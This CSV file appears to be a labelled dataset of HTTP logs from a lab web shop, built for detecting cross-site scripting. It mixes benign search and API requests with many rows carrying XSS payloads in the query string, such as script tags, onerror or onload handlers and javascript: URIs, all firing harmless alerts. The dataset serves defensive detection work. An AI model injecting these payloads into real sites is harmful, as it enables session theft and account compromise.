timestamp,src_ip,src_port,dest_ip,dest_port,proto,http_method,http_status,http_resp_len,http_url,http_user_agent,http_url_len,url_contains_script_tag,url_contains_onerror,label
2025-08-20T06:11:18.853791+0000,100.64.0.10,60816,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-20T06:11:20.881168+0000,100.64.0.10,39794,100.64.0.20,3000,TCP,GET,200,3748,/?q=<video%20src='invalid'%20onerror='alert(1)'>,curl/7.81.0,44,0,1,1
2025-08-20T06:11:53.331444+0000,100.64.0.10,44256,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-20T06:10:58.556064+0000,100.64.0.10,41972,100.64.0.20,3000,TCP,GET,200,3748,/?q=<input%20autofocus%20onfocus=alert(1)>,curl/7.81.0,38,0,0,1
2025-08-20T06:11:04.649120+0000,100.64.0.10,36978,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-20T06:12:33.909609+0000,100.64.0.10,43338,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-20T06:12:01.443065+0000,100.64.0.10,33828,100.64.0.20,3000,TCP,GET,200,3748,/?q=<video%20src='invalid'%20onerror='alert(1)'>,curl/7.81.0,44,0,1,1
2025-08-20T06:07:57.612523+0000,100.64.0.10,52774,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:07:36.099316+0000,100.64.0.10,60332,100.64.0.20,3000,TCP,GET,200,3748,/?q=juice,curl/7.81.0,9,0,0,0
2025-08-20T06:07:08.557770+0000,100.64.0.10,41016,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:07:42.249803+0000,100.64.0.10,41338,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:12:42.024118+0000,100.64.0.10,44788,100.64.0.20,3000,TCP,GET,200,3748,/?q=<video%20src='invalid'%20onerror='alert(1)'>,curl/7.81.0,44,0,1,1
2025-08-20T06:12:09.556899+0000,100.64.0.10,53070,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-20T06:11:06.678883+0000,100.64.0.10,36988,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-20T06:12:15.637649+0000,100.64.0.10,53108,100.64.0.20,3000,TCP,GET,200,3748,/?q=<iframe%20src='javascript:alert(1)'>,curl/7.81.0,38,0,0,1
2025-08-20T06:07:23.835650+0000,100.64.0.10,60060,100.64.0.20,3000,TCP,GET,200,3748,/?q=apple,curl/7.81.0,9,0,0,0
2025-08-20T06:12:23.761441+0000,100.64.0.10,41908,100.64.0.20,3000,TCP,GET,200,3748,/?q=<details%20open%20ontoggle=alert(1)>,curl/7.81.0,36,0,0,1
2025-08-20T06:07:45.346256+0000,100.64.0.10,41344,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:06:28.862857+0000,100.64.0.10,36748,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:11:02.620016+0000,100.64.0.10,36962,100.64.0.20,3000,TCP,GET,200,3748,/?q=<details%20open%20ontoggle=alert(1)>,curl/7.81.0,36,0,0,1
2025-08-20T06:11:26.966897+0000,100.64.0.10,39818,100.64.0.20,3000,TCP,GET,200,3748,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>,curl/7.81.0,67,0,0,1
2025-08-20T06:11:35.080085+0000,100.64.0.10,54684,100.64.0.20,3000,TCP,GET,200,3748,/?q=<iframe%20src='javascript:alert(1)'>,curl/7.81.0,38,0,0,1
2025-08-20T06:11:57.386899+0000,100.64.0.10,44276,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg><script>alert(1)</script></svg>,curl/7.81.0,40,1,0,1
2025-08-20T06:10:56.524350+0000,100.64.0.10,41962,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-20T06:12:46.061674+0000,100.64.0.10,44800,100.64.0.20,3000,TCP,GET,200,3748,/?q=<embed%20src='javascript:alert(1)'>,curl/7.81.0,37,0,0,1
2025-08-20T06:11:12.768821+0000,100.64.0.10,60788,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-20T06:12:19.700983+0000,100.64.0.10,41882,100.64.0.20,3000,TCP,GET,200,3748,/?q=<input%20autofocus%20onfocus=alert(1)>,curl/7.81.0,38,0,0,1
2025-08-20T06:06:41.067730+0000,100.64.0.10,41470,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:07:54.515871+0000,100.64.0.10,52758,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:07:14.679670+0000,100.64.0.10,51266,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-20T06:08:03.662697+0000,100.64.0.10,51978,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-20T06:10:48.410618+0000,100.64.0.10,50246,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-20T06:06:59.389174+0000,100.64.0.10,40992,100.64.0.20,3000,TCP,GET,200,3748,/?q=healthy,curl/7.81.0,11,0,0,0
2025-08-20T06:11:41.165715+0000,100.64.0.10,41074,100.64.0.20,3000,TCP,GET,200,3748,/?q=<body%20onload=alert(1)>,curl/7.81.0,26,0,0,1
2025-08-20T06:11:31.023926+0000,100.64.0.10,54666,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=x%20onerror=alert(1)>,curl/7.81.0,32,0,1,1
2025-08-20T06:11:28.996628+0000,100.64.0.10,39832,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-20T06:06:25.830167+0000,100.64.0.10,36738,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-20T06:07:48.382477+0000,100.64.0.10,41358,100.64.0.20,3000,TCP,GET,200,3748,/?q=orange,curl/7.81.0,10,0,0,0
2025-08-20T06:12:48.080647+0000,100.64.0.10,44812,100.64.0.20,3000,TCP,GET,200,3748,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>,curl/7.81.0,67,0,0,1
2025-08-20T06:11:00.583553+0000,100.64.0.10,36950,100.64.0.20,3000,TCP,GET,200,3748,/?q=<body%20onload=alert(1)>,curl/7.81.0,26,0,0,1
2025-08-20T06:06:10.494488+0000,100.64.0.10,37736,100.64.0.20,3000,TCP,GET,200,3748,/?q=apple,curl/7.81.0,9,0,0,0
2025-08-20T06:11:10.736702+0000,100.64.0.10,60778,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
2025-08-20T06:06:53.265077+0000,100.64.0.10,57716,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:08:00.637107+0000,100.64.0.10,51974,100.64.0.20,3000,TCP,GET,200,3748,/?q=juice,curl/7.81.0,9,0,0,0
2025-08-20T06:11:24.937807+0000,100.64.0.10,39812,100.64.0.20,3000,TCP,GET,200,3748,/?q=<embed%20src='javascript:alert(1)'>,curl/7.81.0,37,0,0,1
2025-08-20T06:11:45.221812+0000,100.64.0.10,41088,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-20T06:07:11.582643+0000,100.64.0.10,51260,100.64.0.20,3000,TCP,GET,200,3748,/?q=orange,curl/7.81.0,10,0,0,0
2025-08-20T06:11:33.051994+0000,100.64.0.10,54678,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg%20onload=alert(1)>,curl/7.81.0,25,0,0,1
2025-08-20T06:07:17.707611+0000,100.64.0.10,51270,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:06:19.751093+0000,100.64.0.10,36730,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:06:22.788520+0000,100.64.0.10,36732,100.64.0.20,3000,TCP,GET,200,3748,/?q=healthy,curl/7.81.0,11,0,0,0
2025-08-20T06:11:43.193849+0000,100.64.0.10,41082,100.64.0.20,3000,TCP,GET,200,3748,/?q=<details%20open%20ontoggle=alert(1)>,curl/7.81.0,36,0,0,1
2025-08-20T06:12:13.610473+0000,100.64.0.10,53102,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg%20onload=alert(1)>,curl/7.81.0,25,0,0,1
2025-08-20T06:07:02.419909+0000,100.64.0.10,40996,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-20T06:12:07.526890+0000,100.64.0.10,33858,100.64.0.20,3000,TCP,GET,200,3748,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>,curl/7.81.0,67,0,0,1
2025-08-20T06:10:54.495857+0000,100.64.0.10,41946,100.64.0.20,3000,TCP,GET,200,3748,/?q=<iframe%20src='javascript:alert(1)'>,curl/7.81.0,38,0,0,1
2025-08-20T06:12:29.847828+0000,100.64.0.10,43318,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=1%20onerror=prompt(1)>,curl/7.81.0,33,0,1,1
2025-08-20T06:07:05.451138+0000,100.64.0.10,41002,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:06:04.323642+0000,100.64.0.10,55600,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:12:39.995389+0000,100.64.0.10,44772,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-20T06:11:22.909069+0000,100.64.0.10,39808,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-20T06:12:35.937869+0000,100.64.0.10,43342,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>''-alert(1)//</script>,curl/7.81.0,34,1,0,1
2025-08-20T06:11:14.798113+0000,100.64.0.10,60798,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>''-alert(1)//</script>,curl/7.81.0,34,1,0,1
2025-08-20T06:12:27.820410+0000,100.64.0.10,41920,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-20T06:07:20.807860+0000,100.64.0.10,60054,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:11:51.305658+0000,100.64.0.10,44248,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
2025-08-20T06:12:17.672326+0000,100.64.0.10,53120,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-20T06:12:03.472007+0000,100.64.0.10,33830,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-20T06:11:37.108691+0000,100.64.0.10,54700,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-20T06:07:33.072104+0000,100.64.0.10,60326,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:07:26.942724+0000,100.64.0.10,60066,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-20T06:12:25.789686+0000,100.64.0.10,41918,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-20T06:12:44.042295+0000,100.64.0.10,44798,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-20T06:06:16.651539+0000,100.64.0.10,37766,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:11:16.825768+0000,100.64.0.10,60802,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg><script>alert(1)</script></svg>,curl/7.81.0,40,1,0,1
2025-08-20T06:11:59.415828+0000,100.64.0.10,33818,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-20T06:06:38.039165+0000,100.64.0.10,38042,100.64.0.20,3000,TCP,GET,500,3285,/api/Baskets,curl/7.81.0,12,0,0,0
2025-08-20T06:11:47.249161+0000,100.64.0.10,41100,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-20T06:12:21.729873+0000,100.64.0.10,41896,100.64.0.20,3000,TCP,GET,200,3748,/?q=<body%20onload=alert(1)>,curl/7.81.0,26,0,0,1
2025-08-20T06:06:44.170727+0000,100.64.0.10,41472,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:06:56.361095+0000,100.64.0.10,57732,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-20T06:07:29.972869+0000,100.64.0.10,60322,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-20T06:07:39.214243+0000,100.64.0.10,60342,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-20T06:07:51.485992+0000,100.64.0.10,52754,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-20T06:12:37.966370+0000,100.64.0.10,43354,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg><script>alert(1)</script></svg>,curl/7.81.0,40,1,0,1
2025-08-20T06:06:13.619431+0000,100.64.0.10,37750,100.64.0.20,3000,TCP,GET,200,80223,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-20T06:06:47.196052+0000,100.64.0.10,41474,100.64.0.20,3000,TCP,GET,200,3748,/?q=healthy,curl/7.81.0,11,0,0,0
2025-08-20T06:12:11.585405+0000,100.64.0.10,53086,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=x%20onerror=alert(1)>,curl/7.81.0,32,0,1,1
